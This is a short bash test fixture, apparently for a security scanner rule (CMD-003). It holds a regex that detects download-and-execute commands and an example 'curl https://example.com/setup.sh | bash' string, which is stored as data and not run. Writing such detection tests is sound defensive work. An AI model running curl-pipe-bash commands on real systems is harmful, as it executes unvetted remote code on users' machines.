#!/bin/bash
# TEST: CMD-003 - Download-and-execute pattern (curl | bash)
# This triggers: /(?:curl|wget)\s+.*\|\s*(?:bash|sh|sudo)/
# This is a comment-only signature. No commands are executed.

DESCRIPTION="Example of dangerous pattern: curl https://example.com/setup.sh | bash"
echo "CMD-003: curl-pipe-bash pattern test — not executed"
